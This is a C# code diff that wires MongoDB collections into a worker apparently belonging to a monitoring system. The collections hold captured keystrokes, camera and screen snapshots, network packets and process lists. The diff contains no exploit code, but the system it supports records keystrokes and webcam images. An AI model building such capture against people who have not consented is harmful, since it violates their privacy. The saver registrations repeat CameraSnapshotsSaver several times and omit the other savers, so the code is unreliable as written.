@@ -3,8 +3,12 @@ using Confluent.Kafka.Serialization;
 using EMS.Infrastructure.DependencyInjection;
 using EMS.Infrastructure.DependencyInjection.Interfaces;
 using EMS.Infrastructure.Stream;
+using EMS.Web.Common.Mongo;
+using EMS.Web.Worker.MongoSaver.Models;
+using MongoDB.Driver;
 using System.Collections.Generic;
 using System.Text;
+using System.Threading;
 
 namespace EMS.Web.Worker.MongoSaver.App_Start
 {
@@ -14,8 +18,48 @@ namespace EMS.Web.Worker.MongoSaver.App_Start
         {
             var injector = UnityInjector.Instance;
 
+            this.RegisterCancellationToken(injector);
             this.RegisterKafkaProducer(injector);
             this.RegisterKafkaConsumer(injector);
+            this.RegisterMongoCollections(injector);
+            this.RegisterMongoSavers(injector);
+        }
+
+        private void RegisterCancellationToken(IInjector injector)
+        {
+            injector.RegisterInstance<CancellationToken>(new CancellationToken());
+        }
+
+        private void RegisterMongoCollections(IInjector injector)
+        {
+            var mongoClient = new MongoClient("mongodb://localhost:27017");
+            var mongoDatabase = mongoClient.GetDatabase("Spyder");
+
+            var networkPacketsCollection = mongoDatabase.GetCollection<CapturedNetworkPacket>(MongoCollections.NetworkPackets);
+            var keyboardKeysCollection = mongoDatabase.GetCollection<CapturedKeyboardKey>(MongoCollections.CapturedKeyboardKeys);
+            var cameraSnapshotsCollection = mongoDatabase.GetCollection<CapturedCameraSnapshot>(MongoCollections.CameraSnapshots);
+            var activeProcessesCollection = mongoDatabase.GetCollection<CapturedActiveProcesses>(MongoCollections.ActiveProcesses);
+            var displaySnapshotsCollection = mongoDatabase.GetCollection<CapturedDisplaySnapshot>(MongoCollections.DisplaySnapshots);
+            var foregroundProcessesCollection = mongoDatabase.GetCollection<CapturedForegroundProcess>(MongoCollections.ForegroundProcesses);
+
+            injector.RegisterInstance<IMongoClient>(mongoClient);
+            injector.RegisterInstance<IMongoDatabase>(mongoDatabase);
+            injector.RegisterInstance<IMongoCollection<CapturedNetworkPacket>>(nameof(CapturedNetworkPacket), networkPacketsCollection);
+            injector.RegisterInstance<IMongoCollection<CapturedKeyboardKey>>(nameof(CapturedKeyboardKey), keyboardKeysCollection);
+            injector.RegisterInstance<IMongoCollection<CapturedCameraSnapshot>>(nameof(CapturedCameraSnapshot), cameraSnapshotsCollection);
+            injector.RegisterInstance<IMongoCollection<CapturedActiveProcesses>>(nameof(CapturedActiveProcesses), activeProcessesCollection);
+            injector.RegisterInstance<IMongoCollection<CapturedDisplaySnapshot>>(nameof(CapturedDisplaySnapshot), displaySnapshotsCollection);
+            injector.RegisterInstance<IMongoCollection<CapturedForegroundProcess>>(nameof(CapturedForegroundProcess), foregroundProcessesCollection);
+        }
+
+        private void RegisterMongoSavers(IInjector injector)
+        {
+            injector.Register<NetworkPacketsSaver, NetworkPacketsSaver>();
+            injector.Register<CameraSnapshotsSaver, CameraSnapshotsSaver>();
+            injector.Register<ActiveProcessesSaver, ActiveProcessesSaver>();
+            injector.Register<CameraSnapshotsSaver, CameraSnapshotsSaver>();
+            injector.Register<CameraSnapshotsSaver, CameraSnapshotsSaver>();
+            injector.Register<CameraSnapshotsSaver, CameraSnapshotsSaver>();
         }
 
         private void RegisterKafkaProducer(IInjector injector)
